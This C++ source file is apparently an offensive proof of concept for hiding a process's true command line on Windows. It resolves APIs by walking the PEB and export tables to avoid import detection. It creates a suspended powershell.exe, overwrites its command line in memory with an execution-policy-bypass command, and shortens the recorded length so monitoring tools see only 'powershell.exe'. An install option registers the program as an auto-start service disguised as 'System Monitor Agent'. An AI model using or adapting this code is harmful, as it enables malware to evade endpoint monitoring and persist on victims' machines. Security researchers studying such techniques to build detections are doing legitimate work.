#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "ntdll.lib")

// Redefine standard types for clarity and to match NTAPI conventions
typedef long NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// Structures required for PEB walking and EAT parsing
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;


namespace ApiResolver {
    // Simple hashing function for module names
    DWORD calcHash(const wchar_t* str) {
        DWORD hash = 0x99;
        for (size_t i = 0; i < wcslen(str); ++i) {
            hash += (wchar_t)tolower(str[i]) + (hash << 1);
        }
        return hash;
    }

    // Get module base address from the PEB
    HMODULE getModuleBase(const wchar_t* moduleName) {
        PEB* peb = (PEB*)__readgsqword(0x60);
        PEB_LDR_DATA* ldr = peb->Ldr;
        LIST_ENTRY* listHead = &(ldr->InMemoryOrderModuleList);
        LIST_ENTRY* listEntry = listHead->Flink;
        DWORD targetHash = calcHash(moduleName);

        while (listEntry != listHead) {
            LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            if (entry->BaseDllName.Buffer) {
                if (calcHash(entry->BaseDllName.Buffer) == targetHash) {
                    return (HMODULE)entry->DllBase;
                }
            }
            listEntry = listEntry->Flink;
        }
        return NULL;
    }

    // Get function address from a module's EAT
    FARPROC getFuncAddr(HMODULE module, const char* funcName) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)module + dosHeader->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        PDWORD addrOfFunctions = (PDWORD)((LPBYTE)module + exportDir->AddressOfFunctions);
        PDWORD addrOfNames = (PDWORD)((LPBYTE)module + exportDir->AddressOfNames);
        PWORD addrOfNameOrdinals = (PWORD)((LPBYTE)module + exportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            const char* currentFuncName = (const char*)((LPBYTE)module + addrOfNames[i]);
            if (strcmp(currentFuncName, funcName) == 0) {
                return (FARPROC)((LPBYTE)module + addrOfFunctions[addrOfNameOrdinals[i]]);
            }
        }
        return NULL;
    }
}


// Custom PEB structure to match C# exactly
struct CUSTOM_PEB {
    BYTE Filler[16];
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PVOID ProcessParameters;
};

// Custom RTL_USER_PROCESS_PARAMETERS structure to match C# exactly
struct CUSTOM_RTL_USER_PROCESS_PARAMETERS {
    BYTE Filler[112];
    USHORT Length;
    USHORT MaximumLength;
    PVOID CommandLine;
};

// Debug functions
void Debug(const std::wstring& text) {
#ifdef _DEBUG
    std::wcout << text << std::endl;
#endif
}

void Debug(const std::wstring& text, const std::vector<std::wstring>& args) {
#ifdef _DEBUG
    std::wstring formatted = text;
    for (size_t i = 0; i < args.size(); i++) {
        std::wstring placeholder = L"{" + std::to_wstring(i) + L"}";
        size_t pos = formatted.find(placeholder);
        if (pos != std::wstring::npos) {
            formatted.replace(pos, placeholder.length(), args[i]);
        }
    }
    std::wcout << formatted << std::endl;
#endif
}

// Helper function to pad string
std::wstring PadRight(const std::wstring& str, size_t totalWidth, wchar_t paddingChar) {
    if (str.length() >= totalWidth) return str;
    return str + std::wstring(totalWidth - str.length(), paddingChar);
}

// Define function pointer types for all the functions we need to resolve
typedef NTSTATUS(NTAPI* tNtCreateUserProcess)(PHANDLE, PHANDLE, ACCESS_MASK, ACCESS_MASK, POBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES, ULONG, ULONG, PRTL_USER_PROCESS_PARAMETERS, PVOID, PVOID);
typedef NTSTATUS(NTAPI* tRtlCreateProcessParametersEx)(PRTL_USER_PROCESS_PARAMETERS*, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, ULONG);
typedef NTSTATUS(NTAPI* tNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* tNtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* tNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* tNtResumeThread)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI* tNtClose)(HANDLE);
typedef VOID(NTAPI* tRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef BOOL(WINAPI* tCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef DWORD(WINAPI* tWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL(WINAPI* tCloseHandle)(HANDLE);
typedef DWORD(WINAPI* tGetLastError)();


int main(int argc, char* argv[]);

void InstallService(tCreateProcessW pCreateProcessW, tWaitForSingleObject pWaitForSingleObject, tCloseHandle pCloseHandle, tGetLastError pGetLastError) {
    Debug(L"[+] Attempting to install service...");

    // Get the path to the current executable from the PEB
    PEB* peb = (PEB*)__readgsqword(0x60);
    RTL_USER_PROCESS_PARAMETERS* params = peb->ProcessParameters;
    std::wstring exePath(params->ImagePathName.Buffer, params->ImagePathName.Length / sizeof(wchar_t));

    // Construct the command to create the service
    std::wstring command = L"sc.exe create SysmonAgent binPath= \"";
    command += exePath;
    command += L"\" start= auto DisplayName= \"System Monitor Agent\"";

    Debug(L"[+] Service creation command: " + command);

    // Use CreateProcessW to run the command
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    if (pCreateProcessW(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        Debug(L"[+] Service installation command executed.");
        pWaitForSingleObject(pi.hProcess, INFINITE);
        pCloseHandle(pi.hProcess);
        pCloseHandle(pi.hThread);
        Debug(L"[+] Service installed successfully.");
    } else {
        Debug(L"[!] Service installation failed. Error: " + std::to_wstring(pGetLastError()));
    }
}


int main(int argc, char* argv[]) {
    // Resolve all necessary functions dynamically
    HMODULE ntdll = ApiResolver::getModuleBase(L"ntdll.dll");
    HMODULE kernel32 = ApiResolver::getModuleBase(L"kernel32.dll");

    tNtCreateUserProcess pNtCreateUserProcess = (tNtCreateUserProcess)ApiResolver::getFuncAddr(ntdll, "NtCreateUserProcess");
    tRtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (tRtlCreateProcessParametersEx)ApiResolver::getFuncAddr(ntdll, "RtlCreateProcessParametersEx");
    tNtQueryInformationProcess pNtQueryInformationProcess = (tNtQueryInformationProcess)ApiResolver::getFuncAddr(ntdll, "NtQueryInformationProcess");
    tNtReadVirtualMemory pNtReadVirtualMemory = (tNtReadVirtualMemory)ApiResolver::getFuncAddr(ntdll, "NtReadVirtualMemory");
    tNtWriteVirtualMemory pNtWriteVirtualMemory = (tNtWriteVirtualMemory)ApiResolver::getFuncAddr(ntdll, "NtWriteVirtualMemory");
    tNtResumeThread pNtResumeThread = (tNtResumeThread)ApiResolver::getFuncAddr(ntdll, "NtResumeThread");
    tNtClose pNtClose = (tNtClose)ApiResolver::getFuncAddr(ntdll, "NtClose");
    tRtlInitUnicodeString pRtlInitUnicodeString = (tRtlInitUnicodeString)ApiResolver::getFuncAddr(ntdll, "RtlInitUnicodeString");

    tCreateProcessW pCreateProcessW = (tCreateProcessW)ApiResolver::getFuncAddr(kernel32, "CreateProcessW");
    tWaitForSingleObject pWaitForSingleObject = (tWaitForSingleObject)ApiResolver::getFuncAddr(kernel32, "WaitForSingleObject");
    tCloseHandle pCloseHandle = (tCloseHandle)ApiResolver::getFuncAddr(kernel32, "CloseHandle");
    tGetLastError pGetLastError = (tGetLastError)ApiResolver::getFuncAddr(kernel32, "GetLastError");

    if (argc > 1 && strcmp(argv[1], "--install") == 0) {
        InstallService(pCreateProcessW, pWaitForSingleObject, pCloseHandle, pGetLastError);
        return 0;
    }

    // The malicious command (exactly as in C#)
    std::wstring maliciousCommand = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";


    // The command to spoof (exactly as in C#)
    std::wstring spoofedCommand = PadRight(L"powershell.exe", maliciousCommand.length(), L' ');

    Debug(L"=== COMMAND LINE SPOOFER STARTED ===");
    Debug(L"[+] Malicious command length: " + std::to_wstring(maliciousCommand.length()));
    Debug(L"[+] Malicious command: " + maliciousCommand);
    Debug(L"[+] Spoofed command length: " + std::to_wstring(spoofedCommand.length()));
    Debug(L"[+] Spoofed command: " + spoofedCommand.substr(0, spoofedCommand.find_last_not_of(L' ') + 1));
    Debug(L"[+] Spoofed command (with padding): " + spoofedCommand);

    // Spawn a process to spoof the command line of
    Debug(L"[+] Creating suspended process...");
    PROCESS_INFORMATION pi = { 0 };
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

    UNICODE_STRING imagePath;
    pRtlInitUnicodeString(&imagePath, L"\\??\\C:\\Windows\\System32\\powershell.exe");

    UNICODE_STRING commandLine;
    pRtlInitUnicodeString(&commandLine, const_cast<LPWSTR>(spoofedCommand.c_str()));

    PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
    NTSTATUS status = pRtlCreateProcessParametersEx(
        &processParameters,
        &imagePath,
        NULL,
        NULL,
        &commandLine,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED
    );

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] RtlCreateProcessParametersEx failed! NTSTATUS: 0x" + std::to_wstring(status));
        return 1;
    }

    struct PS_CREATE_INFO {
        SIZE_T Size;
        ULONG_PTR State;
        BYTE InitialState[24]; // Simplified
    } createInfo = { sizeof(PS_CREATE_INFO), 0 };

    status = pNtCreateUserProcess(
        &hProcess,
        &hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        0,
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
        processParameters,
        &createInfo,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] NtCreateUserProcess failed! NTSTATUS: 0x" + std::to_wstring(status));
        return 1;
    }

    pi.hProcess = hProcess;
    pi.hThread = hThread;

    // Get process and thread IDs from the handles
    PROCESS_BASIC_INFORMATION pbi_for_ids = { 0 };
    pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi_for_ids, sizeof(pbi_for_ids), NULL);
    pi.dwProcessId = (DWORD)pbi_for_ids.UniqueProcessId;
    // We don't have a direct way to get thread ID from handle via NTAPI without more complex calls,
    // so we will leave it 0 for this PoC. The PID is the more important one for tracking.
    pi.dwThreadId = 0;


    Debug(L"[+] Process spawned successfully!");
    Debug(L"[+] Process ID: " + std::to_wstring(pi.dwProcessId));
    Debug(L"[+] Thread ID: " + std::to_wstring(pi.dwThreadId));

    // Grab the PEB address of the newly spawned process
    Debug(L"[+] Querying process information...");
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;

    status = pNtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Unable to read PEB address! NTSTATUS: 0x" + std::to_wstring(status));
        pNtClose(pi.hProcess);
        pNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] NtQueryInformationProcess successful!");
    Debug(L"[+] Return length: " + std::to_wstring(returnLength));
    std::wstringstream ss;
    ss << std::hex << pbi.PebBaseAddress;
    Debug(L"[+] PEB Address: 0x" + ss.str());

    // Read the PEB structure, so we can get the ProcessParameters address
    Debug(L"[+] Reading PEB structure...");
    CUSTOM_PEB peb = { 0 };
    SIZE_T bytesRead = 0;
    status = pNtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(status));
        pNtClose(pi.hProcess);
        pNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] PEB structure read successfully! Bytes read: " + std::to_wstring(bytesRead));
    std::wstringstream ss2;
    ss2 << std::hex << peb.ProcessParameters;
    Debug(L"[+] ProcessParameters Address: 0x" + ss2.str());

    // Read the ProcessParameters structure, so we can get the CmdLine address
    Debug(L"[+] Reading ProcessParameters structure...");
    CUSTOM_RTL_USER_PROCESS_PARAMETERS procParams = { 0 };
    status = pNtReadVirtualMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), &bytesRead);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(status));
        pNtClose(pi.hProcess);
        pNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] ProcessParameters structure read successfully! Bytes read: " + std::to_wstring(bytesRead));
    Debug(L"[+] CommandLine Length: " + std::to_wstring(procParams.Length));
    Debug(L"[+] CommandLine MaximumLength: " + std::to_wstring(procParams.MaximumLength));

    std::wstringstream ss3;
    ss3 << std::hex << procParams.CommandLine;
    Debug(L"[+] CommandLine Address: 0x" + ss3.str());

    // Read the CommandLine address
    Debug(L"[+] Reading original command line...");
    std::vector<wchar_t> cmdLineBuffer(procParams.Length / sizeof(wchar_t));
    status = pNtReadVirtualMemory(pi.hProcess, procParams.CommandLine, cmdLineBuffer.data(), procParams.Length, &bytesRead);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(status));
        pNtClose(pi.hProcess);
        pNtClose(pi.hThread);
        return 1;
    }

    std::wstring cmdLine(cmdLineBuffer.data());
    Debug(L"[+] Original CommandLine read successfully! Bytes read: " + std::to_wstring(bytesRead));
    Debug(L"[+] Original CommandLine: " + cmdLine);

    // We need to write byte array to procParams.CommandLine
    Debug(L"[+] Preparing to write malicious command...");
    std::vector<wchar_t> newCmdLine(maliciousCommand.begin(), maliciousCommand.end());
    Debug(L"[+] New command line length: " + std::to_wstring(newCmdLine.size()));
    Debug(L"[+] New command line size in bytes: " + std::to_wstring(newCmdLine.size() * sizeof(wchar_t)));

    SIZE_T bytesWritten = 0;
    status = pNtWriteVirtualMemory(pi.hProcess, procParams.CommandLine, newCmdLine.data(), newCmdLine.size() * sizeof(wchar_t), &bytesWritten);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(status));
        pNtClose(pi.hProcess);
        pNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] Malicious command written successfully! Bytes written: " + std::to_wstring(bytesWritten));

    // We also need to write the spoofed command length as ushort to peb.ProcessParameters + 112 bytes
    // This is the key part - we set the length to only show "powershell.exe" length
    Debug(L"[+] Writing spoofed command length...");
    USHORT cmdLineLength = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
    Debug(L"[+] Spoofed command length (bytes): " + std::to_wstring(cmdLineLength));

    std::wstringstream addrStream;
    addrStream << std::hex << (ULONG_PTR)((BYTE*)peb.ProcessParameters + 112);
    Debug(L"[+] Writing to address: 0x" + addrStream.str());

    status = pNtWriteVirtualMemory(pi.hProcess, (PVOID)((BYTE*)peb.ProcessParameters + 112), &cmdLineLength, sizeof(cmdLineLength), &bytesWritten);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(status));
        pNtClose(pi.hProcess);
        pNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(bytesWritten));
    Debug(L"[+] SPOOFING COMPLETE!");
    Debug(L"[+] Process will now show as: 'powershell.exe'");
    Debug(L"[+] But will actually execute: " + maliciousCommand);

    // Resume the process
    Debug(L"[+] Resuming suspended process...");
    ULONG suspendCount = 0;
    status = pNtResumeThread(pi.hThread, &suspendCount);
    Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(status));

    Debug(L"[+] Process resumed successfully!");
    Debug(L"[+] Check Task Manager - the process should show as 'powershell.exe' but execute the malicious command");
    Debug(L"Press a key to end PoC...");
    std::wcin.get();

    // Cleanup
    Debug(L"[+] Cleaning up handles...");
    pNtClose(pi.hProcess);
    pNtClose(pi.hThread);
    Debug(L"[+] Cleanup complete!");

    return 0;
}
